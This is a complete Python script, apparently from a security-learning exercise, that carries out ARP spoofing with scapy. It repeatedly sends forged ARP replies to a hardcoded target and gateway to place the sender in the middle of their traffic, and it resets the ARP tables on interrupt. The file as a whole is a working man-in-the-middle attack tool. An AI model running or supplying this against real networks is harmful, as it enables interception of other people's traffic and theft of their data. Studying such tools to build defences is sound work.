#!/usr/bin/env python

import  scapy.all as scapy 
import time 
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    #print(arp_request.summary())
    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #This creates a ethernet frame/object
    #print(broadcast.summary())
    arp_request_broadcast= broadcast/arp_request
    #arp_request_broadcast.show()#to show options in the class
    answered_list =scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]
    #print(answered_list.summary())
    #print(unanswered_list.summary())
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip="192.168.1.17"
gateway_ip="192.168.1.1"


try:
    sent_packets_count = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packets_count= sent_packets_count + 2 
        #works in python 2.7 and below
        #print("\r[+] Packets Sent  "+ str(sent_packets_count)),
        #sys.stdout.flush()
        #works in python3

        print("\r[+] Packets Sent  "+ str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]Detected CTRL + C ......Resetting ARP Tables ......Please Wait.\n ")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)



